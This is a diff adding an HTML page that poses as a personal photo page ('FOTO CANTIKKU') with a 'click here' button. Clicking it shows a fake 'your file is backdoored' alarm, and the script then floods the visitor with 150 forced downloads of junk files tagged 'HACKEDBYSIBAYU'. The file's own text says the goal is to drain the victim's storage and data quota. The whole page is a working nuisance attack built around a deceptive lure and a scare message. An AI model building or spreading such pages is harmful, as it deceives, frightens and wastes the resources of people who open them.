@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Auto Downloader</title>
+<style>
+  body {
+    display: flex;
+    height: 100vh;
+    margin: 0;
+    background: #121212;
+    color: #eee;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    justify-content: center;
+    align-items: center;
+    flex-direction: column;
+    overflow: hidden;
+  }
+  button {
+    background: linear-gradient(45deg, #6a11cb, #2575fc);
+    border: none;
+    border-radius: 8px;
+    color: white;
+    padding: 16px 32px;
+    font-size: 1.2rem;
+    cursor: pointer;
+    transition: background 0.3s ease;
+    box-shadow: 0 4px 15px rgba(37,117,252,0.75);
+    user-select: none;
+  }
+  button:hover {
+    background: linear-gradient(45deg, #2575fc, #6a11cb);
+  }
+  h1 {
+    margin-bottom: 32px;
+  }
+
+  #warningBox {
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    margin-top: 20px;
+    animation: fadeIn 0.5s ease-in-out forwards;
+  }
+
+  .cross {
+    width: 80px;
+    height: 80px;
+    position: relative;
+    margin-bottom: 16px;
+  }
+  .cross::before, .cross::after {
+    content: "";
+    position: absolute;
+    top: 0;
+    left: 50%;
+    width: 10px;
+    height: 100%;
+    background-color: red;
+    transform-origin: center;
+    border-radius: 5px;
+  }
+  .cross::before {
+    transform: rotate(45deg);
+  }
+  .cross::after {
+    transform: rotate(-45deg);
+  }
+
+  .warning-text {
+    color: red;
+    font-size: 1.5rem;
+    font-weight: bold;
+    margin-bottom: 10px;
+    text-align: center;
+  }
+
+  .sub-text {
+    color: #ccc;
+    font-size: 1rem;
+    text-align: center;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: scale(0.9); }
+    to { opacity: 1; transform: scale(1); }
+  }
+
+  @media (max-width: 400px) {
+    body {
+      padding: 12px;
+    }
+    button {
+      width: 100%;
+      font-size: 1rem;
+      padding: 14px 0;
+    }
+  }
+</style>
+</head>
+<body>
+<h1>FOTO CANTIKKU</h1>
+<button id="downloadBtn">click here</button>
+
+<div id="warningBox">
+  <div class="cross"></div>
+  <div class="warning-text">WARNING!!!</div>
+  <div class="sub-text">FILE KAMU TERKENA BACKDOOR!!.</div>
+</div>
+
+<script>
+  function createAndDownloadFile(filename, content) {
+    const blob = new Blob([content], { type: 'application/octet-stream' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = filename;
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+    URL.revokeObjectURL(url);
+  }
+
+  document.getElementById('downloadBtn').addEventListener('click', () => {
+    document.getElementById('warningBox').style.display = 'flex';
+
+    const totalFiles = 150;
+    let index = 1;
+
+    function triggerDownload() {
+      if (index > totalFiles) return;
+      const filename = `HACKEDBYSIBAYU충돌${index}.eagle`;
+      const content = `INI BUKAN RANSOMWARE,APALAGI MALWARE HANYA SAJA JIKA DIPIKIR INI AKAN MENGURAS PENYIMPANAN DAN KUOTA ${filename}`;
+      createAndDownloadFile(filename, content);
+      index++;
+      setTimeout(triggerDownload, 100); // jeda antar download
+    }
+
+    setTimeout(triggerDownload, 1200); // delay untuk menampilkan animasi dulu
+  });
+</script>
+</body>
+</html>
